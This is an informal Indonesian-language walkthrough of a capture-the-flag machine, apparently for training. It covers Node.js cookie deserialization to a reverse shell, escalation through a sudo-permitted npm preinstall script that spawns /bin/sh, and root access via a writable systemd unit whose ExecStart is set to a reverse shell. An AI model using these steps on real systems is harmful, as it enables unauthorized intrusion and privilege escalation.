# boot:
1. scan nmap 8080 doang -> baca wu ternyata bug deserialization
2. coba ke cookie burp decode -> ganti aja isadmin admin -> encode lagi ke base64 ke url 
3. dah ada sekarang coba salahin cookie nya nanti ada error
4. https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
5. https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
6. dah cek cek aja hasil baca wu
7. dapet nodeshell pakein ip ama port argumen -> dah dapet eval satuin ama json tadi yang rce payload tadi
8. encode ke base64 -> tuker cookie nya jadi itu dah jadi nc aja
9. horizontal PE -> sudo -l ada npm -> kita taruh di tmp aja deh
10. mkdir exploit di /tmp -> echo '{"scripts": {"preinstall": "/bin/sh"}}' > /tmp/exploit/package.json  
11. sudo -u user_lain npm -C /tmp/exploit --unsafe-perm i
12. dah aman klaim flag user 

# PE :
1. sudo -l -> ada cek di /etc/systemd/system -> disitu edit2 aja ls -la writeable soalnya
2. coba add ini dulu: ExecStart=/bin/sh -c 'revshell' 
3. ralat ternyata bukan yang di sudo -l tapi ada lagi ls aja system nya -> di sudo -l dia ambil unit dari file itu
4. nah ganti aja execstart di file itu jadi /bin/bash -c 'revshell' -> nyalain nc 
5. sudo -l ada daemon reload stop start lakuin aja urut pake sudo 
6. klaim root 
